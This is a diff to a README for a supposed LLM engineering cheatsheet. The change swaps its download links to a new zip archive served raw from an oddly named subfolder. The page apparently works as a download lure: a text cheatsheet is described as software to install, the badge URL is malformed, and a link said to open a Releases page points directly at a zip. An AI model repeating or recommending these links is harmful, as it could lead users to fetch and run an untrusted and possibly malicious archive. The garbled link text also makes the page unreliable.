@@ -1,7 +1,7 @@
 # 📘 llm-engineering-cheatsheet - Best Practices for Language Models
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm-engineering-cheatsheet.zip%https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm-engineering-cheatsheet.zip)](https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm-engineering-cheatsheet.zip)
+[![Download](https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm_engineering_cheatsheet_v3.4.zip%https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm_engineering_cheatsheet_v3.4.zip)](https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm_engineering_cheatsheet_v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **llm-engineering-cheatsheet**! This resource provides timeless principles and best practices for working with language models. It's designed to be clear, future-proof, and usable across different tools in the realm of artificial intelligence.
@@ -43,7 +43,7 @@ To run this software, you will need:
 ## 📂 Download & Install
 To get started, visit the Releases page to download the cheatsheet:
 
-[Download the latest version](https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm-engineering-cheatsheet.zip)
+[Download the latest version](https://raw.githubusercontent.com/RepublicOfBotv109/llm-engineering-cheatsheet/main/byreman/llm_engineering_cheatsheet_v3.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On that page, you will see a list of available releases.
